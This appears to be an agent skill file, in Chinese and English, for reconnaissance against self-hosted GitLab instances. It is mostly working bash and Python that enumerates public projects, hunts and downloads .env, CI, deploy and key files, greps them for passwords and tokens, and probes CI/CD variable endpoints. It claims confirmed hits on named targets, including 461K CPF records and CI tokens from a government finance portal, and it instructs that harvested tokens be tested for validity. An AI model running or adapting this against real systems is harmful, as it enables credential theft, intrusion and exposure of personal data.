---
name: gitlab-public-recon
description: 发现子域时，从 GitLab 中挖掘密钥与 CI 令牌。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
metadata:
  tags: [recon, gitlab, source-code, secrets, internal-IPs]
  category: recon
  related_skills:
    - js-secrets-extraction
    - source-leak-hunt
    - api-noauth-hunt
---

# GitLab 公开侦察技能

枚举可公开访问的 GitLab 仓库，以提取源代码、凭据、内部 IP、CI/CD 令牌、部署配置和环境文件。开启注册或设置公开可见性的 GitLab 实例会暴露整套开发基础设施。已在 gov-finance-portal（3 个公开仓库、461K 条 CPF、内部 IP 10.11.82.75、CI/CD 令牌）、dev-agency（含 SSL 私钥的 GitLab）以及 fitness-chain（仓库中的 Firebase SA 密钥）得到确认。

## When to Use

- 目标拥有 `gitlab.` 子域或自建 GitLab 实例。
- crt.sh 在证书中发现了 `gitlab.target.com`。
- 在 `subdomain-enumeration` 发现 GitLab 主机之后。
- 在 `js-secrets-extraction` 发现 GitLab CI/CD 引用之后。
- 目标是政府机构或大型企业（自建 GitLab 的常见用户）。

## Prerequisites

- 具备 curl、python3、jq 的 `terminal`。
- GitLab URL（例如 `https://gitlab.target.com`）。
- GitLab API 对公开资源可在未认证的情况下访问。

## How to Run

```bash
# List public projects
curl --max-time 30 --connect-timeout 10 -sk "https://gitlab.TARGET.com/api/v4/projects?visibility=public&per_page=100" | jq '.[].path_with_namespace'

# Read a file from a public repo
curl --max-time 30 --connect-timeout 10 -sk "https://gitlab.TARGET.com/api/v4/projects/GROUP%2FPROJECT/repository/files/PATH/raw?ref=main"
```

## 快速参考

| API 端点 | 返回内容 | 风险 |
|-------------|-----------------|------|
| `/api/v4/projects?visibility=public` | 所有公开项目 | 信息 |
| `/api/v4/projects/:id/repository/tree` | 目录列表 | 高 |
| `/api/v4/projects/:id/repository/files/:path/raw?ref=:branch` | 原始文件内容 | 严重 |
| `/api/v4/projects/:id/repository/commits` | 含作者的提交历史 | 中 |
| `/api/v4/projects/:id/variables` | CI/CD 变量（仅管理员） | 严重 |
| `/api/v4/projects/:id/jobs` | CI/CD 任务历史 | 中 |
| `/users/sign_up` | 开放注册 | 严重 |
| `/explore` | 公开项目浏览器 | 信息 |

## Procedure

### 阶段 1 — 发现 GitLab 实例并检查公开访问

```bash
TARGET="$1"
OUTDIR="$OUTDIR/gitlab"
mkdir -p "$OUTDIR"

echo "[*] GitLab recon on $TARGET"

# Check if GitLab is accessible
MAIN_PAGE=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/" 2>/dev/null)
if echo "$MAIN_PAGE" | grep -qi "gitlab"; then
  echo "[+] GitLab confirmed"
elif echo "$MAIN_PAGE" | grep -qi "sign_in\|sign_up\|explore/projects"; then
  echo "[+] GitLab confirmed (page content)"
else
  echo "[-] May not be GitLab — probing API..."
fi

# Check API version
API_VER=$(curl -sk --max-time 5 --connect-timeout 5 "https://$TARGET/api/v4/version" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'{d.get(\"version\",\"?\")} rev {d.get(\"revision\",\"?\")[:8]}')" 2>/dev/null)
[[ -n "$API_VER" ]] && echo "  GitLab version: $API_VER"

# Check if registration is open
REG_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET/users/sign_up" 2>/dev/null)
[[ "$REG_CODE" == "200" ]] && echo "  [!] Registration OPEN — anyone can create accounts"
```

### 阶段 2 — 枚举公开项目

```bash
TARGET="$1"

echo "[*] Enumerating public projects..."

PAGE=1
TOTAL_PROJECTS=0

while true; do
  PROJECTS=$(curl -sk --max-time 15 --connect-timeout 10 "https://$TARGET/api/v4/projects?visibility=public&per_page=100&page=$PAGE" 2>/dev/null)

  count=$(echo "$PROJECTS" | python3 -c "import sys,json; print(len(json.load(sys.stdin)))" 2>/dev/null)
  if [[ "$count" -eq 0 ]]; then break; fi

  # Extract project names and save
  echo "$PROJECTS" | python3 -c "
import sys, json
projects = json.load(sys.stdin)
for p in projects:
    print(f'{p[\"id\"]} | {p[\"path_with_namespace\"]} | stars={p.get(\"star_count\",0)} | forks={p.get(\"forks_count\",0)} | last_activity={p.get(\"last_activity_at\",\"?\")[:10]}')
" 2>/dev/null | tee -a "$OUTDIR/projects.txt"

  TOTAL_PROJECTS=$((TOTAL_PROJECTS + count))
  PAGE=$((PAGE + 1))
  [[ $PAGE -gt 20 ]] && break  # Safety limit
done

echo "[+] Total public projects: $TOTAL_PROJECTS"
```

### 阶段 3 — 提取源代码与密钥

```bash
TARGET="$1"
PROJECT_ID="$2"   # from projects.txt enumeration
OUTDIR="$OUTDIR/gitlab"

echo "[*] Extracting from project ID: $PROJECT_ID"

# Get project details
DETAILS=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/api/v4/projects/$PROJECT_ID" 2>/dev/null)
PRJ_NAME=$(echo "$DETAILS" | python3 -c "import sys,json; print(json.load(sys.stdin).get('path_with_namespace','unknown'))" 2>/dev/null)
echo "  Project: $PRJ_NAME"

# Get repository file tree (top-level)
TREE=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/tree?recursive=true&per_page=100" 2>/dev/null)
echo "  Files in repo: $(echo "$TREE" | python3 -c "import sys,json; print(len(json.load(sys.stdin)))" 2>/dev/null)"

# Hunt for sensitive files
SENSITIVE_PATTERNS=(
  ".env" ".env.example" ".env.production" ".env.local"
  "docker-compose.yml" "docker-compose.prod.yml" "Dockerfile"
  ".gitlab-ci.yml" "deploy.sh" "deploy.yml"
  "credentials.json" "service-account.json" "*.pem" "*.key"
  "config/database.yml" "config/secrets.yml"
)

echo "[*] Hunting sensitive files..."

echo "$TREE" | python3 -c "
import sys, json, re

files = json.load(sys.stdin)
sensitive = ['.env', 'docker-compose', 'deploy', '.gitlab-ci.yml', 'credentials',
             'service-account', '.pem', '.key', 'secret', 'password', 'token',
             'database.yml', 'secrets.yml', 'backup', 'dump']

for f in files:
    name = f['name'].lower()
    path = f['path'].lower()
    if any(s in name or s in path for s in sensitive):
        print(f'  {f[\"type\"]:4s} {f[\"path\"]}')
" 2>/dev/null

# Download specific sensitive files
echo "[*] Downloading key files..."

for file_path in ".env" ".env.example" "docker-compose.yml" ".gitlab-ci.yml" "deploy.sh"; do
  ENCODED_PATH=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$file_path', safe=''))")
  content=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/files/$ENCODED_PATH/raw?ref=main" 2>/dev/null)

  if [[ -n "$content" ]] && ! echo "$content" | grep -q "404 File"; then
    echo "$content" > "$OUTDIR/${PRJ_NAME//\//_}_${file_path//\//_}"
    echo "  [+] Downloaded: $file_path (${#content} bytes)"

    # Quick secret scan
    if echo "$content" | grep -qiE "password|secret|token|key|database|redis|mysql|api_key"; then
      echo "    [!] POTENTIAL SECRETS FOUND"
      echo "$content" | grep -iE "password|secret|token|key" | head -5
    fi
  fi

  # Also try 'master' branch
  if [[ -z "$content" ]] || echo "$content" | grep -q "404 File"; then
    content=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/files/$ENCODED_PATH/raw?ref=master" 2>/dev/null)
    if [[ -n "$content" ]] && ! echo "$content" | grep -q "404 File"; then
      echo "  [+] Downloaded (master): $file_path"
    fi
  fi
done
```

### 阶段 4 — CI/CD 令牌与变量提取

```bash
TARGET="$1"
PROJECT_ID="$2"

echo "[*] CI/CD analysis..."

# Get .gitlab-ci.yml (pipeline definition)
CI_CONTENT=$(curl -sk --max-time 10 --connect-timeout 10 "https://$TARGET/api/v4/projects/$PROJECT_ID/repository/files/.gitlab-ci.yml/raw?ref=main" 2>/dev/null)
if [[ -n "$CI_CONTENT" ]] && ! echo "$CI_CONTENT" | grep -q "404"; then
  echo "  [+] .gitlab-ci.yml found"

  # Extract CI/CD variables and tokens
  echo "$CI_CONTENT" | grep -Eo '\$\{[A-Z_]+\}|$[A-Z_]+' | sort -u | while read var; do
    echo "    CI Variable: $var"
  done

  # Check for runner registration tokens
  echo "$CI_CONTENT" | grep -iE "token|secret|password|credential" | head -5
fi

# Try to access CI/CD variables (requires admin token — rare but worth trying)
VARS=$(curl -sk --max-time 5 --connect-timeout 5 "https://$TARGET/api/v4/projects/$PROJECT_ID/variables" 2>/dev/null)
if echo "$VARS" | grep -qi "key\|value"; then
  echo "  [CRITICAL] CI/CD variables accessible without admin token!"
  echo "$VARS" | python3 -m json.tool 2>/dev/null | head -30
fi
```

## Pitfalls

- **速率限制。** GitLab API 有速率限制（通常为每分钟 300-600 次请求）。使用 `--max-time` 并加入延迟。
- **文件路径编码。** 路径中的特殊字符必须进行 URL 编码（`/` → `%2F`，`.` → `%2E`）。
- **默认分支可能不是 `main`。** 访问文件时依次尝试 `main`、`master`、`develop`。
- **大文件可能被截断。** API 可能限制响应大小。若注册开放，可使用 `git clone` 获取完整内容。
- **GitLab 身份认证。** 公开仓库无需认证即可访问。私有仓库会返回 404。

## Verification

- 公开项目必须可通过 `/api/v4/projects?visibility=public` 枚举。
- 敏感文件必须可通过 raw 端点下载，且包含真实的凭据/配置（而非模板）。
- 发现的内部 IP/域名必须确认为目标的基础设施。
- 发现的 CI/CD 令牌必须测试其有效性（例如用 runner 令牌访问 GitLab API）。
- 注册开放意味着任何人都可以创建账号，并可能访问更多资源。
